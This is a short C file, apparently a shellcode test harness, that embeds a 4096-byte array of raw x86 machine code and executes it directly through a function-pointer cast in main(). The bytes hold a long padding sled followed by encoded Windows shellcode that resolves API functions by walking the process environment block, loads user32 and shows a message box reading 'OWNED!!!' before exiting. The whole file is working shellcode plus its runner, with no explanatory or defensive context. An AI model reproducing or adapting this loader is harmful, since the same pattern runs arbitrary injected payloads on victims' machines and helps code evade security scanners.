#include <stdio.h>

#define SCSIZE 4096

char payload[SCSIZE] = {0xf9,0x72, 0x49,0x46, 0x25,0x15, 0x0d,0x7f, 0x3c,0x3d, 0x84,0xe0, 0x2a,0xd6, 0x39,0xe1, 0x4a,0xa8, 0xb9,0x76, 0x24,0x98, 0x78,0x73, 0x71,0x7d, 0x7f,0x75, 0x76,0x20, 0xd4,0x96, 0x91,0xba, 0x70,0x19, 0xf9,0xb8, 0x32,0xe2, 0x7b,0x46, 0xa8,0x9b, 0x01,0xfe, 0xc6,0xc7, 0xc1,0xe3, 0x24,0x7e, 0x7c,0x43, 0x80,0xe1, 0x15,0xb1, 0xb2,0xb3, 0x66,0x4f, 0xb6,0x27, 0x3c,0x9f, 0x4e,0x7a, 0x2d,0x41, 0xbf,0xbb, 0x05,0x77, 0x28,0xf5, 0x93,0x92, 0x90,0x99, 0x98,0xa9, 0x47,0x0a, 0xeb,0x14, 0x49,0x3d, 0x4b,0x48, 0x2f,0x37, 0x8d,0xb9, 0x78,0x34, 0xb4,0x0b, 0xd2,0xd5, 0x31,0xe0, 0x72,0x35, 0x10,0xd6, 0x40,0x67, 0xbe,0x2b, 0xfd,0x4a, 0x1c,0x04, 0x97,0x3f, 0x3a,0xfc, 0x79,0x74, 0x1d,0x42, 0xb5,0xb7, 0x2c,0x0c, 0x0d,0x13, 0xf8,0x25, 0xb0,0x76, 0x79,0x4e, 0xb1,0x7b, 0x66,0x0c, 0xbb,0x2d, 0x1c,0x91, 0x2f,0xa9, 0x2c,0xb8, 0xb0,0x8d, 0x7e,0x0d, 0x96,0x3b, 0xd4,0x49, 0x6b,0xd5, 0xb7,0x03, 0xf7,0xe1, 0x7d,0x46, 0xb9,0x77, 0x42,0x3d, 0x1d,0x11, 0xe0,0x67, 0x92,0x4b, 0x85,0xeb, 0x71,0x24, 0x48,0x9b, 0x02,0xf9, 0x15,0x4f, 0xba,0x04, 0x00,0xe3, 0x27,0x87, 0xd6,0x9f, 0x70,0x47, 0x7a,0x18, 0xe2,0x73, 0x1b,0xfd, 0x74,0x25, 0x7c,0x43, 0x90,0x41, 0xb6,0x97, 0x99,0x14, 0x3c,0x78, 0x37,0x83, 0xf8,0xb3, 0x35,0x72, 0x3f,0x69, 0xf5,0x98, 0xbe,0x7f, 0x75,0x4a, 0x93,0xb4, 0xa8,0xb5, 0xbf,0x21, 0xd0,0xfc, 0x40,0x34, 0x7b,0x05, 0xb2,0xb2, 0x71,0x7c, 0x4e,0x81, 0xe1,0x22, 0xeb,0x04, 0x4a,0x88, 0xe2,0x2c, 0x2d,0x49, 0x42,0x8d, 0xb3,0x75, 0x23,0xf5, 0x7f,0x72, 0x0b,0xfc, 0x97,0x01, 0xf7,0xd3, 0xf9,0x90, 0xbe,0x41, 0x1c,0xa8, 0x25,0x7d, 0x35,0xb1, 0x78,0x79, 0x0a,0xf8, 0x32,0xfd, 0x9b,0x76, 0x1d,0x92, 0xb4,0xbb, 0xb8,0x77, 0x7e,0x70, 0x73,0x40, 0x7a,0x0c, 0x89,0xd6, 0x91,0x24, 0x46,0x14, 0xba,0x9f, 0x87,0xc0, 0xd4,0x0d, 0xb0,0x4b, 0x2f,0xb6, 0x81,0xe3, 0x74,0x05, 0xb9,0x3f, 0x67,0x1b, 0xd5,0x93, 0x96,0x83, 0xe0,0x66, 0xb5,0x47, 0xb7,0x98, 0x3c,0x15, 0x34,0xa9, 0x48,0x37, 0x27,0x3d, 0x75,0x4f, 0xbf,0x8c, 0xe2,0x43, 0x99,0xb8, 0x73,0x38, 0xeb,0x7d, 0x7a,0x25, 0x85,0xf9, 0x8d,0xbb, 0x91,0x7f, 0x67,0x96, 0x92,0xb2, 0x79,0x48, 0x3c,0x4a, 0x33,0xd4, 0xa9,0x97, 0x7e,0x37, 0x47,0xb3, 0x3d,0x93, 0x24,0x05, 0x3f,0x9f, 0x39,0xe1, 0x71,0x35, 0xb4,0x23, 0xd6,0xa8, 0x14,0x88, 0xd1,0xf8, 0x72,0x42, 0xba,0x76, 0x08,0xfd, 0x41,0xbe, 0x4b,0xb5, 0x0d,0x15, 0x77,0x43, 0x74,0x11, 0xe3,0x78, 0x20,0xe0, 0x1c,0x04, 0xbf,0x40, 0x10,0xd5, 0x27,0xb7, 0xb1,0x70, 0x2b,0xf5, 0x2f,0x22, 0xfc,0x4e, 0x9b,0x98, 0x1d,0x90, 0x2c,0xb6, 0x7c,0x4f, 0x2d,0x34, 0x66,0x0c, 0x99,0xb0, 0x49,0x7b, 0x7a,0x78, 0x7e,0x7f, 0x73,0x7d, 0x46,0xb9, 0x91,0xb0, 0x8d,0x92, 0xbf,0x90, 0xb7,0x21, 0xf6,0xe0, 0x4b,0x13, 0xf5,0x29, 0xeb,0x67, 0x77,0x25, 0x86,0xe1, 0x05,0x2a, 0xd6,0x66, 0xb9,0xa8, 0x35,0x15, 0x96,0x42, 0x98,0x34, 0x99,0xb1, 0xba,0xb4, 0x2c,0xb5, 0x12,0xf8, 0x93,0x4f, 0x76,0x7b, 0x79,0x30, 0xfd,0xbe, 0x71,0x3f, 0x40,0x4e, 0xb3,0x7c, 0x75,0x27, 0x09,0xe2, 0x24,0x43, 0x70,0x0c, 0x2d,0x18, 0xe3,0x02, 0xf9,0x4a, 0x47,0xbb, 0xb6,0x41, 0x9f,0x72, 0x48,0x97, 0x80,0xd4, 0x28,0xd5, 0x9b,0x74, 0x3c,0x1c, 0x84,0xfc, 0x7d,0x49, 0xb8,0x7e, 0x6b,0xd2, 0xe0,0x1d, 0x76,0x0d, 0x74,0x31, 0xeb,0x14, 0x70,0x37, 0xa9,0x71, 0x3d,0x72, 0x46,0xb2, 0x78,0x2f, 0x7f,0x04, 0xa9,0xb6, 0x7b,0x1c, 0x73,0x3a, 0xe1,0x3c, 0xbe,0x19, 0xf9,0x34, 0x00,0xd5, 0x7a,0x03, 0xf8,0xe2, 0x24,0xb0, 0x4e,0xfd, 0x79,0x3d, 0x96,0x75, 0x15,0x9b, 0x49,0x7c, 0x2f,0xb4, 0x4f,0x9f, 0x99,0x47, 0x3b,0xc1, 0xd0,0xe3, 0x14,0x40, 0x3f,0x90, 0xbf,0x41, 0x97,0x43, 0x8d,0xb8, 0x48,0xb5, 0x77,0x0d, 0xb2,0x4a, 0x93,0x2d, 0x67,0x92, 0x98,0xb1, 0x1a,0xfc, 0xb9,0xd4, 0x2c,0xb3, 0xf5,0xba, 0x0c,0x69, 0xd6,0x91, 0xa8,0x04, 0xbb,0x1d, 0x66,0x46, 0x05,0x25, 0xb7,0x35, 0x42,0x37, 0x27,0x4b, 0x90,0xfc, 0x33,0xd2, 0xb2,0x30, 0x64,0xff, 0x32,0x5a, 0x8b,0x52, 0x0c,0x8b, 0x52,0x14, 0x8b,0x72, 0x28,0x33, 0xc9,0xb1, 0x18,0x33, 0xff,0x33, 0xc0,0xac, 0x3c,0x61, 0x7c,0x02, 0x2c,0x20, 0xc1,0xcf, 0x0d,0x03, 0xf8,0xe2, 0xf0,0x81, 0xff,0x5b, 0xbc,0x4a, 0x6a,0x8b, 0x5a,0x10, 0x8b,0x12, 0x75,0xda, 0x8b,0x53, 0x3c,0x03, 0xd3,0xff, 0x72,0x34, 0x8b,0x52, 0x78,0x03, 0xd3,0x8b, 0x72,0x20, 0x03,0xf3, 0x33,0xc9, 0x41,0xad, 0x03,0xc3, 0x81,0x38, 0x47,0x65, 0x74,0x50, 0x75,0xf4, 0x81,0x78, 0x04,0x72, 0x6f,0x63, 0x41,0x75, 0xeb,0x81, 0x78,0x08, 0x64,0x64, 0x72,0x65, 0x75,0xe2, 0x49,0x8b, 0x72,0x24, 0x03,0xf3, 0x66,0x8b, 0x0c,0x4e, 0x8b,0x72, 0x1c,0x03, 0xf3,0x8b, 0x14,0x8e, 0x03,0xd3, 0x52,0x33, 0xff,0x57, 0x68,0x61, 0x72,0x79, 0x41,0x68, 0x4c,0x69, 0x62,0x72, 0x68,0x4c, 0x6f,0x61, 0x64,0x54, 0x53,0xff, 0xd2,0x68, 0x33,0x32, 0x01,0x01, 0x66,0x89, 0x7c,0x24, 0x02,0x68, 0x75,0x73, 0x65,0x72, 0x54,0xff, 0xd0,0x68, 0x6f,0x78, 0x41,0x01, 0x8b,0xdf, 0x88,0x5c, 0x24,0x03, 0x68,0x61, 0x67,0x65, 0x42,0x68, 0x4d,0x65, 0x73,0x73, 0x54,0x50, 0xff,0x54, 0x24,0x2c, 0x57,0x68, 0x44,0x21, 0x21,0x21, 0x68,0x4f, 0x57,0x4e, 0x45,0x8b, 0xdc,0xe8, 0x00,0x00, 0x00,0x00, 0x8b,0x14, 0x24,0x81, 0x72,0x0b, 0x16,0xa3, 0xfb,0x32, 0x68,0x79, 0xce,0xbe, 0x32,0x81, 0x72,0x17, 0xae,0x45, 0xcf,0x48, 0x68,0xc1, 0x2b,0xe1, 0x2b,0x81, 0x72,0x23, 0x10,0x36, 0x9f,0xd2, 0x68,0x71, 0x44,0xfa, 0xff,0x81, 0x72,0x2f, 0xf7,0xa9, 0xa9,0x0c, 0x68,0x84, 0xe9,0xcf, 0x60,0x81, 0x72,0x3b, 0xbe,0x93, 0xa9,0x43, 0x68,0xd2, 0xa3,0x98, 0x37,0x81, 0x72,0x47, 0x82,0x8a, 0x62,0x3b, 0x68,0xef, 0xa4,0x11, 0x4b,0x81, 0x72,0x53, 0xd6,0x47, 0xc0,0xcc, 0x68,0xbe, 0x69,0xa4, 0xff,0x81, 0x72,0x5f, 0xa3,0xca, 0x54,0x31, 0x68,0xd4, 0xab,0x65, 0x52,0x8b, 0xcc,0x57, 0x53,0x51, 0x57,0x8b, 0xf1,0x89, 0xf7,0x83, 0xc7,0x1e, 0x39,0xfe, 0x7d,0x0b, 0x81,0x36, 0x42,0x45, 0x45,0x46, 0x83,0xc6, 0x04,0xeb, 0xf1,0xff, 0xd0,0x68, 0x65,0x73, 0x73,0x01, 0x8b,0xdf, 0x88,0x5c, 0x24,0x03, 0x68,0x50, 0x72,0x6f, 0x63,0x68, 0x45,0x78, 0x69,0x74, 0x54,0xff, 0x74,0x24, 0x40,0xff, 0x54,0x24, 0x40,0x57, 0xff,0xd0};
int main(int argc, char **argv) {
	(*(void (*)()) payload)();
	return(0);
}